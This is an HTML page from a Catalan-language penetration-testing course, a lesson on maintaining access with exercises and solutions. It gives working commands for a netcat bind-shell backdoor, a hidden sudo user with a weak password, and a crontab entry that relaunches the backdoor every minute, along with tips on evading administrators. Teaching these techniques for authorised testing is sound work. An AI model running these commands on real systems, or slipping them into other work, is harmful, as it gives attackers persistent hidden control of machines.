<!DOCTYPE html>
<html lang="ca">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manteniment de l'Accés</title>

    <link rel="alternate" href="https://campusempresa.com/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" hreflang="en" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body >
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-8 p-2 p-md-0">
			<h1 class="m-0 p-0">
				<a href="/"><img src="/img/logo_header.png"></a>
			</h1>
		</div>
		<div class="col-12 col-md-4 p-2 p-md-0 text-end">
			<h2 id="main_title"><cite>Construint la societat d'avui i del demà</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
							<a href="https://enterprisecampus.net/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">EN</a></b>
				|
				<a href="https://campusempresa.com/mod/pentesting/05-02-mantenimiento-del-acceso" class="px-2">ES</a></b>
				|
				<b class="px-2">CA</b>
											</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/objective">El Projecte</a>
				<a href="/about">Sobre nosaltres</a>
				<a href="/contribute">Contribuir</a>
				<a href="/donate">Donacions</a>
				<a href="/licence">Llicència</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content">
								<div class='row navigation'>
	<div class='col-2'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegis">&#x25C4;Anterior</a>
			</div>
	<div class='col-8 text-center'>
					<a href="./"><h2 style="text-decoration:underline">Manteniment de l'Accés</h2></a>
			</div>
	<div class='col-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Petjades">Següent &#x25BA;</a>
			</div>
</div>
<div class='content'><p>El manteniment de l'accés és una fase crucial en el procés de pentesting, ja que permet als atacants mantenir el control sobre un sistema compromès durant un període prolongat. Aquesta fase implica la implementació de mecanismes que permetin l'accés remot i la persistència en el sistema, fins i tot després de reinicis o altres intents de neteja per part dels administradors del sistema.</p>
</div><h1><p>Objectius del Manteniment de l'Accés</p>
</h1>
<div class='content'><ul>
<li><strong>Persistència:</strong> Assegurar que l'accés es mantingui fins i tot després de reinicis del sistema o altres accions de manteniment.</li>
<li><strong>Accés remot:</strong> Configurar mecanismes per accedir al sistema de manera remota en qualsevol moment.</li>
<li><strong>Evasió de detecció:</strong> Implementar tècniques per evitar la detecció per part de sistemes de seguretat i administradors.</li>
</ul>
</div><h1><p>Tècniques Comunes de Manteniment de l'Accés</p>
</h1>
<div class='content'></div><h2><ol>
<li>Backdoors</li>
</ol>
</h2>
<div class='content'><p>Les backdoors són mecanismes que permeten l'accés remot al sistema sense necessitat d'autenticació. Poden ser programes o scripts que s'executen en segon pla.</p>
<h4>Exemple de codi:</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFeGVtcGxlIGQndW5hIGJhY2tkb29yIHNpbXBsZSBlbiBCYXNoCndoaWxlIHRydWU7IGRvCiAgbmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaApkb25l"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Exemple d'una backdoor simple en Bash
while true; do
  nc -lvp 4444 -e /bin/bash
done</pre></div><div class='content'><p><strong>Explicació:</strong></p>
<ul>
<li><code>nc -lvp 4444 -e /bin/bash</code>: Utilitza <code>netcat</code> per escoltar en el port 4444 i executar <code>/bin/bash</code> quan es connecti algú.</li>
</ul>
</div><h2><ol start="2">
<li>Rootkits</li>
</ol>
</h2>
<div class='content'><p>Els rootkits són eines que permeten als atacants mantenir l'accés al sistema amagant la seva presència i les seves activitats.</p>
<h4>Tipus de Rootkits:</h4>
<ul>
<li><strong>Kernel-level rootkits:</strong> Modifiquen el nucli del sistema operatiu per amagar processos, fitxers i connexions de xarxa.</li>
<li><strong>User-level rootkits:</strong> Substitueixen binaris del sistema per versions malicioses que amaguen l'activitat de l'atacant.</li>
</ul>
</div><h2><ol start="3">
<li>Creació d'Usuaris Ocults</li>
</ol>
</h2>
<div class='content'><p>Crear usuaris amb privilegis elevats que no siguin fàcilment detectables pels administradors.</p>
<h4>Exemple de codi:</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBBZmVnZWl4IHVuIHVzdWFyaSBvY3VsdCBhbWIgcHJpdmlsZWdpcyBkZSByb290CnVzZXJhZGQgLW0gLXAgJChvcGVuc3NsIHBhc3N3ZCAtMSAncGFzc3dvcmQnKSAtcyAvYmluL2Jhc2ggaGlkZGVudXNlcgp1c2VybW9kIC1hRyBzdWRvIGhpZGRlbnVzZXI="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Afegeix un usuari ocult amb privilegis de root
useradd -m -p $(openssl passwd -1 'password') -s /bin/bash hiddenuser
usermod -aG sudo hiddenuser</pre></div><div class='content'><p><strong>Explicació:</strong></p>
<ul>
<li><code>useradd -m -p $(openssl passwd -1 'password') -s /bin/bash hiddenuser</code>: Crea un usuari amb el nom <code>hiddenuser</code> i la contrasenya <code>password</code>.</li>
<li><code>usermod -aG sudo hiddenuser</code>: Afegeix l'usuari <code>hiddenuser</code> al grup <code>sudo</code> per obtenir privilegis de root.</li>
</ul>
</div><h2><ol start="4">
<li>Modificació de Fitxers de Configuració</li>
</ol>
</h2>
<div class='content'><p>Modificar fitxers de configuració per assegurar que els serveis maliciosos s'iniciïn automàticament amb el sistema.</p>
<h4>Exemple de codi:</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBBZmVnZWl4IHVuYSBlbnRyYWRhIGFsIGNyb250YWIgcGVyIGV4ZWN1dGFyIHVuYSBiYWNrZG9vciBjYWRhIG1pbnV0CmVjaG8gIiogKiAqICogKiAvdXNyL2Jpbi9uYyAtbHZwIDQ0NDQgLWUgL2Jpbi9iYXNoIiA+PiAvZXRjL2Nyb250YWI="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Afegeix una entrada al crontab per executar una backdoor cada minut
echo &quot;* * * * * /usr/bin/nc -lvp 4444 -e /bin/bash&quot; &gt;&gt; /etc/crontab</pre></div><div class='content'><p><strong>Explicació:</strong></p>
<ul>
<li><code>echo &quot;* * * * * /usr/bin/nc -lvp 4444 -e /bin/bash&quot; &gt;&gt; /etc/crontab</code>: Afegeix una entrada al crontab per executar la backdoor cada minut.</li>
</ul>
</div><h1><p>Exercicis Pràctics</p>
</h1>
<div class='content'></div><h2><p>Exercici 1: Crear una Backdoor Simple</p>
</h2>
<div class='content'><ol>
<li>Utilitza <code>netcat</code> per crear una backdoor que escolti en un port específic.</li>
<li>Prova de connectar-te a la backdoor des d'un altre sistema.</li>
</ol>
<p><strong>Solució:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFbiBlbCBzaXN0ZW1hIGNvbXByb23DqHMKbmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaAoKIyBFbiBlbCBzaXN0ZW1hIGRlIGwnYXRhY2FudApuYyA8SVBfZGVsX3Npc3RlbWFfY29tcHJvbcOocz4gNDQ0NA=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># En el sistema comprom&egrave;s
nc -lvp 4444 -e /bin/bash

# En el sistema de l'atacant
nc &lt;IP_del_sistema_comprom&egrave;s&gt; 4444</pre></div><div class='content'></div><h2><p>Exercici 2: Crear un Usuari Ocult</p>
</h2>
<div class='content'><ol>
<li>Crea un usuari ocult amb privilegis de root.</li>
<li>Verifica que l'usuari pot executar comandes amb privilegis elevats.</li>
</ol>
<p><strong>Solució:</strong></p>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDcmVhciBsJ3VzdWFyaSBvY3VsdAp1c2VyYWRkIC1tIC1wICQob3BlbnNzbCBwYXNzd2QgLTEgJ3Bhc3N3b3JkJykgLXMgL2Jpbi9iYXNoIGhpZGRlbnVzZXIKdXNlcm1vZCAtYUcgc3VkbyBoaWRkZW51c2VyCgojIFZlcmlmaWNhciBlbHMgcHJpdmlsZWdpcwpzdSAtIGhpZGRlbnVzZXIKc3VkbyB3aG9hbWk="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Crear l'usuari ocult
useradd -m -p $(openssl passwd -1 'password') -s /bin/bash hiddenuser
usermod -aG sudo hiddenuser

# Verificar els privilegis
su - hiddenuser
sudo whoami</pre></div><div class='content'></div><h1><p>Errors Comuns i Consells</p>
</h1>
<div class='content'></div><h2><p>Errors Comuns</p>
</h2>
<div class='content'><ul>
<li><strong>No comprovar la persistència:</strong> No verificar si els mecanismes de manteniment de l'accés funcionen després de reinicis del sistema.</li>
<li><strong>Deixar rastres evidents:</strong> Utilitzar noms d'usuaris o fitxers que són fàcilment detectables pels administradors.</li>
</ul>
</div><h2><p>Consells</p>
</h2>
<div class='content'><ul>
<li><strong>Utilitza noms discrets:</strong> Tria noms d'usuaris i fitxers que no cridin l'atenció.</li>
<li><strong>Verifica la persistència:</strong> Prova els mecanismes de manteniment de l'accés després de reinicis i altres accions de manteniment.</li>
</ul>
</div><h1><p>Conclusió</p>
</h1>
<div class='content'><p>El manteniment de l'accés és una fase crítica en el pentesting que permet als atacants mantenir el control sobre un sistema compromès. Utilitzant tècniques com les backdoors, els rootkits, la creació d'usuaris ocults i la modificació de fitxers de configuració, els pentesters poden assegurar-se que poden accedir al sistema en qualsevol moment. És important practicar aquestes tècniques de manera ètica i legal, i sempre amb el consentiment del propietari del sistema.</p>
</div><div class='row navigation'>
	<div class='col-2'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegis">&#x25C4;Anterior</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Petjades">Següent &#x25BA;</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Publicitat</h1>
			<p>Aquest espai està destinat a publicitat.</p>
			<p>Si vols ser patrocinador, contacta amb nosaltres per incloure enllaços en aquesta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Gràcies per col·laborar!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Tots els drets reservats</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir cookies per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Acceptar</a>
    <a href="/cookies">Més informació</a>
</div>	

	</div>    
</body>
</html>
